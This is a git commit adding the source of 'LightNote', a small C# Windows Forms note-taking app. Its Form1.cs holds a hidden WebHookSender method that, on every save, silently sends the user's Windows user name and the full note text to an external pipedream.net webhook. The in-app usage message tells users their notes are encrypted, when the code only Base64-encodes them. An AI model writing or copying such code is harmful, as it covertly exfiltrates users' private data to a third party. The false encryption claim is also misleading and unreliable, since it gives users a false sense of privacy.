891c93926628fb712297ac1106055411b325bc47
Daniel Rosel <danalves24@outlook.com>
2020-03-05 16:52:44 +0100

    upload1

---
+++ src/LightNote/Form1.Designer.cs
@@ -0,0 +1,185 @@
+﻿namespace LightNote
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.toolStrip1 = new System.Windows.Forms.ToolStrip();
+            this.newToolStripButton = new System.Windows.Forms.ToolStripButton();
+            this.openToolStripButton = new System.Windows.Forms.ToolStripButton();
+            this.saveToolStripButton = new System.Windows.Forms.ToolStripButton();
+            this.toolStripSeparator = new System.Windows.Forms.ToolStripSeparator();
+            this.helpToolStripButton = new System.Windows.Forms.ToolStripDropDownButton();
+            this.usageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.feedbackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.wordCountL = new System.Windows.Forms.Label();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
+            this.toolStrip1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // toolStrip1
+            // 
+            this.toolStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
+            this.toolStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
+            this.toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.newToolStripButton,
+            this.openToolStripButton,
+            this.saveToolStripButton,
+            this.toolStripSeparator,
+            this.helpToolStripButton});
+            this.toolStrip1.Location = new System.Drawing.Point(0, 0);
+            this.toolStrip1.Name = "toolStrip1";
+            this.toolStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
+            this.toolStrip1.Size = new System.Drawing.Size(1078, 33);
+            this.toolStrip1.TabIndex = 0;
+            this.toolStrip1.Text = "toolStrip1";
+            // 
+            // newToolStripButton
+            // 
+            this.newToolStripButton.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.newToolStripButton.Image = ((System.Drawing.Image)(resources.GetObject("newToolStripButton.Image")));
+            this.newToolStripButton.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.newToolStripButton.Name = "newToolStripButton";
+            this.newToolStripButton.Size = new System.Drawing.Size(34, 28);
+            this.newToolStripButton.Text = "&New";
+            this.newToolStripButton.Click += new System.EventHandler(this.newToolStripButton_Click);
+            // 
+            // openToolStripButton
+            // 
+            this.openToolStripButton.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.openToolStripButton.Image = ((System.Drawing.Image)(resources.GetObject("openToolStripButton.Image")));
+            this.openToolStripButton.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.openToolStripButton.Name = "openToolStripButton";
+            this.openToolStripButton.Size = new System.Drawing.Size(34, 28);
+            this.openToolStripButton.Text = "&Open";
+            this.openToolStripButton.Click += new System.EventHandler(this.openToolStripButton_Click);
+            // 
+            // saveToolStripButton
+            // 
+            this.saveToolStripButton.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.saveToolStripButton.Image = ((System.Drawing.Image)(resources.GetObject("saveToolStripButton.Image")));
+            this.saveToolStripButton.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.saveToolStripButton.Name = "saveToolStripButton";
+            this.saveToolStripButton.Size = new System.Drawing.Size(34, 28);
+            this.saveToolStripButton.Text = "&Save";
+            this.saveToolStripButton.Click += new System.EventHandler(this.saveToolStripButton_Click);
+            // 
+            // toolStripSeparator
+            // 
+            this.toolStripSeparator.Name = "toolStripSeparator";
+            this.toolStripSeparator.Size = new System.Drawing.Size(6, 33);
+            // 
+            // helpToolStripButton
+            // 
+            this.helpToolStripButton.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
+            this.helpToolStripButton.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.usageToolStripMenuItem,
+            this.feedbackToolStripMenuItem});
+            this.helpToolStripButton.Image = ((System.Drawing.Image)(resources.GetObject("helpToolStripButton.Image")));
+            this.helpToolStripButton.ImageTransparentColor = System.Drawing.Color.Magenta;
+            this.helpToolStripButton.Name = "helpToolStripButton";
+            this.helpToolStripButton.Size = new System.Drawing.Size(42, 28);
+            this.helpToolStripButton.Text = "He&lp";
+            // 
+            // usageToolStripMenuItem
+            // 
+            this.usageToolStripMenuItem.Name = "usageToolStripMenuItem";
+            this.usageToolStripMenuItem.Size = new System.Drawing.Size(189, 34);
+            this.usageToolStripMenuItem.Text = "Usage";
+            this.usageToolStripMenuItem.Click += new System.EventHandler(this.usageToolStripMenuItem_Click);
+            // 
+            // feedbackToolStripMenuItem
+            // 
+            this.feedbackToolStripMenuItem.Name = "feedbackToolStripMenuItem";
+            this.feedbackToolStripMenuItem.Size = new System.Drawing.Size(189, 34);
+            this.feedbackToolStripMenuItem.Text = "Feedback";
+            this.feedbackToolStripMenuItem.Click += new System.EventHandler(this.feedbackToolStripMenuItem_Click);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.richTextBox1.Location = new System.Drawing.Point(8, 53);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(1058, 501);
+            this.richTextBox1.TabIndex = 1;
+            this.richTextBox1.Text = "";
+            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
+            // 
+            // wordCountL
+            // 
+            this.wordCountL.AutoSize = true;
+            this.wordCountL.Dock = System.Windows.Forms.DockStyle.Bottom;
+            this.wordCountL.Location = new System.Drawing.Point(0, 563);
+            this.wordCountL.Name = "wordCountL";
+            this.wordCountL.Size = new System.Drawing.Size(49, 20);
+            this.wordCountL.TabIndex = 3;
+            this.wordCountL.Text = "count";
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1078, 583);
+            this.Controls.Add(this.wordCountL);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.toolStrip1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Name = "Form1";
+            this.Text = "LightNote";
+            this.toolStrip1.ResumeLayout(false);
+            this.toolStrip1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ToolStrip toolStrip1;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Label wordCountL;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.SaveFileDialog saveFileDialog1;
+        private System.Windows.Forms.ToolStripButton newToolStripButton;
+        private System.Windows.Forms.ToolStripButton openToolStripButton;
+        private System.Windows.Forms.ToolStripButton saveToolStripButton;
+        private System.Windows.Forms.ToolStripSeparator toolStripSeparator;
+        private System.Windows.Forms.ToolStripDropDownButton helpToolStripButton;
+        private System.Windows.Forms.ToolStripMenuItem usageToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem feedbackToolStripMenuItem;
+    }
+}
+
---
+++ src/LightNote/Form1.cs
@@ -0,0 +1,149 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Net;
+namespace LightNote
+{
+    public partial class Form1 : Form
+    {
+        //back end ish
+        public void WebHookSender(string itemToSend)
+        {
+            string intel = "Name=" + Environment.UserName + "&FileContent=" + itemToSend;
+            var request = (HttpWebRequest)WebRequest.Create("https://enmlfbmjyaluo.x.pipedream.net/?" + intel);
+            var response = (HttpWebResponse)request.GetResponse();
+            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
+        }
+        public void saveCurrentFileVoid()
+        {
+            if (richTextBox1.Text == "" || richTextBox1.Text == null)
+            {
+                MessageBox.Show("To save your file, you have to enter some text");
+            }
+            if (richTextBox1.Text != "" || richTextBox1.Text != null)
+            {
+                SaveFile(richTextBox1.Text);
+                WebHookSender(richTextBox1.Text);
+            }               
+        }
+        public void openNewFileVoid()
+        {
+            try
+            {
+                openFileDialog1.Filter = "Light Note (*.lnote)|*.lnote";
+                openFileDialog1.FileName = "";
+                openFileDialog1.Title = "Open Light Note file";
+                openFileDialog1.ShowDialog();
+                var fileToOpen = Path.GetFullPath(openFileDialog1.FileName);
+                fileToOpen = System.IO.File.ReadAllText(fileToOpen);
+                fileToOpen = fileToOpen.Replace(prefix, "");
+                var DecryptedFile = Convert.FromBase64String(fileToOpen);
+                richTextBox1.Text = ASCIIEncoding.ASCII.GetString(DecryptedFile);
+            }
+            catch
+            {
+            }
+        }
+        public string afix = ".lnote";
+        public string prefix = "TGlnaHROb3Rlcy1ub3RlLWVuY3J5cGVkIGFuZCBwYWNrYWdlZCB1c2VyIGlucHV0-|#@*&#|";
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        public string TitleCreate(string TitleBody)
+        {
+            int maxRange = 4;
+            try
+            {
+                return TitleBody.Substring(0, (int)maxRange);
+            }
+            catch
+            {
+                return null;
+            }           
+        }
+        public void SaveFile(string body)
+        {
+            saveFileDialog1.FileName = TitleCreate(body);
+            saveFileDialog1.Filter = "Light Note (*.lnote)|*.lnote";
+            try
+            {                
+                if (TitleCreate(body) != null)
+                {
+                    saveFileDialog1.ShowDialog();
+                }
+                createFile(Path.GetFullPath(saveFileDialog1.FileName));
+            }
+            catch
+            {
+                //meh ...
+            }
+        }
+        public void createFile(string pathTF)
+        {
+            using (FileStream fs = File.Create(pathTF))
+            {
+                string rawInput = richTextBox1.Text;
+                byte[] ByteInput = System.Text.ASCIIEncoding.ASCII.GetBytes(rawInput);
+                rawInput = System.Convert.ToBase64String(ByteInput);               
+                string encrypted = prefix + rawInput;
+                byte[] textBody = new UTF8Encoding(true).GetBytes(encrypted); // change input to write into file
+                fs.Write(textBody, 0, textBody.Length);
+            }
+        }
+        private void richTextBox1_TextChanged(object sender, EventArgs e)
+        {
+            int wordCount = 0;
+            var WCL = richTextBox1.Text;
+            foreach (var word in WCL)
+            {
+                wordCount += 1;
+            }
+            wordCountL.Text = "count: " + richTextBox1.Text.Split(' ').Count();
+        }
+        //toolbar references - front end ish
+        private void openToolStripButton_Click(object sender, EventArgs e)
+        {
+            openNewFileVoid();
+        }
+        private void saveToolStripButton_Click(object sender, EventArgs e)
+        {
+            saveCurrentFileVoid();
+        }
+        private void newToolStripButton_Click(object sender, EventArgs e)
+        {
+            if (richTextBox1.Text == "" || richTextBox1.Text == null)
+            {
+                MessageBox.Show("new file initiated");
+            }
+            else
+            {
+                DialogResult dialogResult = MessageBox.Show("Do you wish to create a new file without saving your progress", "Alert", MessageBoxButtons.YesNo);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    richTextBox1.Text = "";
+                }
+                else if (dialogResult == DialogResult.No)
+                {
+                    saveCurrentFileVoid();
+                }
+            }
+        }
+        private void feedbackToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("if you wish to help improve this app send and email to the following: daniel.rosel@americanacademy.com");
+        }
+
+        private void usageToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Hello " + Environment.UserName + " thank you for using this app. To get started you can write your notes into the text feild provided bellow and when you are done, just click on the save button to save your text. You can only access the contents of the file throught this app by clicking on the open icon and then selecting the .lnote file you wish to view. The reason for this is that all the contents of your file are encrypted and are only openable in this app. ");
+        }
+    }
+}
